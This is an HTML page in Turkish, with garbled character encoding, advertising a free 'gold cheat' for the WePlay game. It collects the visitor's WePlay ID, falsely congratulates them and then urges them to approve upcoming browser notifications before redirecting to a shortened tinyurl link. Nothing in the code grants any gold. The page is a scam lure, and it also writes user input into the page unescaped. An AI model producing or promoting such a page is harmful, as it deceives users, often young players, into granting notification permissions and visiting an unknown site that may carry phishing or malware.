<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WePlay AltÄ±n Hilesi</title>
<style>
body {
    font-family: Arial, sans-serif;
    text-align: center;
    background: linear-gradient(to bottom, #f4f4f4, #e0f7fa);
    margin: 0;
    padding: 20px;
    overflow-x: hidden; /* yatay kaydÄ±rmayÄ± gizle */
    overflow-y: auto;   /* dikey kaydÄ±rmaya izin ver */
    position: relative;
}

.animated-text {
    position: absolute;
    white-space: nowrap;
    font-size: 24px;
    font-weight: bold;
    animation: moveText linear infinite;
}

@keyframes moveText {
    0% { transform: translateX(100%); }
    100% { transform: translateX(-100%); }
}

h2 {
    color: #00796b;
    margin-bottom: 20px;
}

input {
    padding: 15px;
    width: 80%;
    font-size: 18px;
    border-radius: 8px;
    border: 2px solid #00796b;
    outline: none;
    margin-bottom: 15px;
}

input:focus {
    border-color: #004d40;
    box-shadow: 0 0 5px #004d40;
}

button {
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
    background: #00796b;
    color: white;
    border: none;
    border-radius: 10px;
    margin-top: 10px;
    transition: all 0.3s ease;
}

button:hover {
    background: #004d40;
    transform: scale(1.05);
}

#message {
    margin-top: 20px;
    font-size: 16px;
    color: #00796b;
    min-height: 20px;
}

/* AltÄ±n simgesi */
.gold {
    position: absolute;
    font-size: 20px;
    animation: fall linear forwards;
}

@keyframes fall {
    0% { transform: translateY(-50px); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
}
</style>
</head>
<body>

<div id="animContainer"></div>

<h2>WePlay AltÄ±n hilesi ðŸ’°</h2>
<input type="text" id="weplayID" placeholder="WePlay IDâ€™nizi girin">
<br>
<button id="gosterBtn">GÃ¶nder</button>

<div id="message"></div>

<script>
// Rastgele renk Ã¼retimi
function getRandomColor() {
    const colors = ['#FF0000','#FF7F00','#FFFF00','#00FF00','#0000FF','#4B0082','#9400D3'];
    return colors[Math.floor(Math.random() * colors.length)];
}

// Animasyonlu yazÄ± oluÅŸtur
function createAnimatedText(text) {
    const container = document.getElementById('animContainer');
    const span = document.createElement('div');
    span.className = 'animated-text';
    span.textContent = text;
    span.style.top = Math.random() * (window.innerHeight - 50) + 'px';
    span.style.color = getRandomColor();
    span.style.animationDuration = (10 + Math.random() * 10) + 's';
    container.appendChild(span);

    span.style.transition = "color 0.5s";
    setInterval(() => {
        span.style.color = getRandomColor();
    }, 1000);
}

// AltÄ±n simgesi oluÅŸtur
function createGold() {
    const container = document.getElementById('animContainer');
    const gold = document.createElement('div');
    gold.className = 'gold';
    gold.textContent = 'ðŸ’°';
    gold.style.left = Math.random() * window.innerWidth + 'px';
    gold.style.animationDuration = (3 + Math.random() * 3) + 's';
    container.appendChild(gold);

    setTimeout(() => {
        if(container.contains(gold)) container.removeChild(gold);
    }, (parseFloat(gold.style.animationDuration) * 1000));
}

// Sayfa aÃ§Ä±ldÄ±ÄŸÄ±nda animasyonlarÄ± baÅŸlat
for(let i = 0; i < 3; i++){
    createAnimatedText("xia cez faniyim");
}
setInterval(createGold, 500); // Daha az yoÄŸun altÄ±n animasyonu

// ID girme ve AltÄ±nÄ± Al iÅŸlemleri
const gosterBtn = document.getElementById('gosterBtn');
gosterBtn.addEventListener('click', () => {
    const id = document.getElementById('weplayID').value.trim();
    const msgBox = document.getElementById('message');

    if(id === '') {
        msgBox.style.color = 'red';
        msgBox.textContent = 'LÃ¼tfen ID girin!';
        return;
    }

    msgBox.style.color = 'green';
    msgBox.innerHTML = `Tebrikler ${id}! AltÄ±n alabilirsin ðŸ’°<br>`;
    
    const altinBtn = document.createElement('button');
    altinBtn.textContent = "AltÄ±nÄ± Al";
    altinBtn.addEventListener('click', uyari);
    msgBox.appendChild(altinBtn);
});

function uyari() {
    const onay = confirm("KarÅŸÄ±nÄ±za gelecek bildirimleri onaylarsanÄ±z altÄ±n alabilirsiniz.");
    if(onay) {
        window.location.href = "https://tinyurl.com/24yu5bos";
    } else {
        alert("AltÄ±n almak iÃ§in bildirimi onaylamanÄ±z gerekiyor!");
    }
}
</script>

</body>
</html>
